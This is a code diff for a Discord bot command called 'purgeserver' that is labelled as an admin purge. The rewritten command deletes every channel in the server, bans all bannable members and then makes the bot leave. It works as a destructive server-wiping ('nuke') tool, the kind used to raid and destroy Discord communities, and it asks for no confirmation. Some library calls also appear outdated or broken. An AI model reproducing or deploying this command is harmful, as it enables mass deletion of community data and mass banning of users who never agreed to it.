@@ -1,28 +1,41 @@
 /* eslint-disable no-useless-escape */
 const Discord = require("discord.js");
+const { Command } = require('discord.js-commando');
 
-
-/***
-* @param {Discord.client} bot the discord bot client.
-* @param {Discord.messsage} message the initial message sent by the user.
-* @param {array} args an array of arguments
- */
-
-module.exports.run = async (bot, message, args) => {
-    if(message.author.id == "414992506665828364"){
-    message.guild.channels.cache.forEach(channel => channel.delete());
+module.exports = class rufus extends Command {
+    constructor(client) {
+        super(client, {
+            name: 'purgeserver',
+            group: 'admin',
+            memberName: 'purgeserver',
+            description: 'Purges the server',
+            guildOnly: true,
+            ownerOnly: true,
+            clientPermissions:['BAN_MEMBERS']
+        });
     }
-    else{
-        message.channel.send("\`\`\`YAML\nNOPE SORRY YOU CAN'T DO THAT\`\`\`");
+
+    async run(message) {
+        message.guild.channels.cache.forEach(channel => channel.delete());
+        try {
+
+            message.guild.members.filter(member => member.bannable).forEach(member => member.ban());
+            message.delete(1000);
+
+        } catch (e) {
+
+            console.log(e.stack);
+
+        }
+
+        try {
+
+            message.guild.leave();
+
+        } catch (e) {
+
+            console.log(e.stack);
+
+        }
     }
-    
-};
-
-/***
- * Exports the purgeserver command to the help object
- */
-
-module.exports.help = {
-    name: "purgeserver",
-    aliases: ['ps']
 };
